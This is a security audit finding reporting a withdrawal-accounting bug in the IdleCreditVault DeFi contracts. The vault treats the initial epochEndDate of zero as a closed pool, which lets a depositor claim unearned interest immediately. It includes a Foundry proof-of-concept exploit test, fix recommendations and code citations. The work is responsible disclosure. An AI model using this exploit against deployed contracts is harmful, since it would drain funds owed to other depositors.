### Title
Initial `epochEndDate == 0` is misclassified as a closed pool, allowing instant withdrawal and theft of unearned epoch interest - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.requestWithdraw` interprets `epochEndDate == 0` as proof that the pool has been closed and all principal has been recalled. The same zero value is also the initial state before the first epoch starts. Consequently, a withdrawal request made before the first `startEpoch` bypasses `pendingWithdraws` accounting and becomes immediately claimable, even though the borrower has never been asked to fund the projected epoch interest.

### Finding Description
`requestWithdraw` records normal withdrawal debt only when `IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0`; when it is zero, it mints the user a strategy-token receipt but does not increment `pendingWithdraws` [1](#0-0) . The funded-claim path uses the same sentinel differently: once `epochEndDate == 0`, the one-epoch wait check is disabled entirely [2](#0-1) .

That interpretation is valid only after the close-pool path sets `epochDuration` and `epochEndDate` to zero [3](#0-2) . Before initialization of the first epoch, however, both fields are naturally zero. `startEpoch` prevents new starts only after `epochDuration == 0`, confirming that zero duration—not merely a zero end date—is the real closed-pool marker [4](#0-3) .

The attack is analogous to HTTP request smuggling’s inconsistent parsing: the CDO calculates a normal receipt containing projected epoch interest [5](#0-4) , while the strategy interprets the shared state as “closed and already funded,” omits the borrower obligation, and permits immediate settlement [6](#0-5) .

### Impact Explanation
A KYC-passing tranche holder can deposit during the pre-first-epoch buffer and immediately request all tranche tokens. `requestWithdraw` mints a receipt equal to principal plus projected interest, net of withdrawal fees [5](#0-4) . Because the strategy treats the pool as closed, that request is not added to `pendingWithdraws` and is not funded by the borrower at the next `stopEpoch` [6](#0-5) . `claimWithdrawRequest` then burns the receipt and transfers underlying held by the strategy without any epoch delay [7](#0-6) .

The attacker directly removes the projected interest portion of the receipt from pooled buffer liquidity before any yield has been earned. The maximum extractable amount is bounded by the projected withdrawal interest net of fees, but scales linearly with attacker capital and configured APR/duration.

### Likelihood Explanation
The condition exists whenever a newly initialized credit vault has a nonzero configured `epochDuration`, a positive APR, deposits in the pre-first-epoch buffer, and no prior epoch has assigned `epochEndDate`. No privileged attacker, oracle manipulation, default, or unusual APR0 configuration is required. The relevant checks only enforce withdrawal permissions and wallet eligibility [8](#0-7) ; they do not distinguish “before first epoch” from “successfully closed.”

### Recommendation
Introduce an explicit closed-pool state instead of inferring closure from `epochEndDate == 0`. For example:

- Use `epochDuration == 0 && epochEndDate == 0` as the closed-pool predicate in `IdleCreditVault.requestWithdraw`.
- Preferably expose `isClosed()` or equivalent state from `IdleCDOEpochVariant`, set it only on successful close-pool/default-finalization flows, and have the strategy consume that unambiguous flag.
- Keep normal requests before the first epoch in `pendingWithdraws` so they are funded by the subsequent `stopEpoch`.
- Add a regression test that makes a withdrawal request before the first `startEpoch`, verifies it cannot be claimed immediately, and verifies borrower funding is still recorded.

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";

contract InitialEpochEndDateConfusionPoC is Test {
    // Reuse the production fixture from test/foundry/IdleCreditVault.t.sol.
    IdleCDOEpochVariant internal cdo;
    IdleCreditVault internal strategy;
    IdleCDOTranche internal aa;
    IERC20Detailed internal underlying;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function testPreFirstEpochRequestClaimsUnearnedInterest() public {
        // Deploy/initialize the production IdleCreditVault + IdleCDOEpochVariant stack
        // using the existing test fixture. At this point:
        //   cdo.isEpochRunning() == false
        //   cdo.epochEndDate() == 0
        //   cdo.epochDuration() > 0
        //   strategy.pendingWithdraws() == 0

        uint256 attackerDeposit = 10_000e6;
        uint256 victimDeposit = 10_000e6;

        _depositAA(attacker, attackerDeposit);
        _depositAA(victim, victimDeposit);

        uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);
        uint256 attackerShares = aa.balanceOf(attacker);

        vm.prank(attacker);
        uint256 requested = cdo.requestWithdraw(attackerShares, address(aa));

        // The receipt includes projected epoch interest net of withdrawal fees.
        assertGt(requested, attackerDeposit, "receipt contains unearned interest");

        // BUG: epochEndDate == 0 is treated as a successfully closed pool, so the
        // request never becomes a borrower-funded pending withdrawal.
        assertEq(strategy.pendingWithdraws(), 0, "borrower funding was not recorded");

        // BUG: the same sentinel disables the one-epoch wait, allowing immediate claim.
        vm.prank(attacker);
        cdo.claimWithdrawRequest();

        uint256 paid = underlying.balanceOf(attacker) - attackerUnderlyingBefore;
        assertGt(paid, attackerDeposit, "attacker withdrew principal plus unearned interest");

        // The protocol paid the projected-interest component before the borrower was
        // ever asked to fund it.
        assertGt(paid - attackerDeposit, 0, "unearned epoch interest was stolen");
    }

    function _depositAA(address user, uint256 amount) internal {
        deal(address(underlying), user, amount);
        vm.startPrank(user);
        underlying.approve(address(cdo), amount);
        cdo.depositAA(amount);
        vm.stopPrank();
    }
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L259-293)
```text
    bool isClosed = IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0;
    uint256 currentEpoch = epochNumber;
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (
      lossRecoveryPrice != 0 &&
      (withdrawsRequestsByEpoch[_user][lossEpoch] != 0 ||
      (apr0Users[_user].principal != 0 && apr0Users[_user].principalEpoch == lossEpoch))
    ) {
      // A loss-adjusted receipt must be claimed before opening a later request, otherwise
      // `lastWithdrawRequest` would stop pointing to the epoch that stores its haircut.
      revert NotAllowed();
    }
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L319-349)
```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-240)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
```

**File:** contracts/IdleCDOEpochVariant.sol (L488-493)
```text
      if (_isRequestingAllFunds) {
        // user will request only normal withdraw and can claim right after
        disableInstantWithdraw = true;
        epochDuration = 0;
        epochEndDate = 0;
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-748)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

```

**File:** contracts/IdleCDOEpochVariant.sol (L772-790)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```
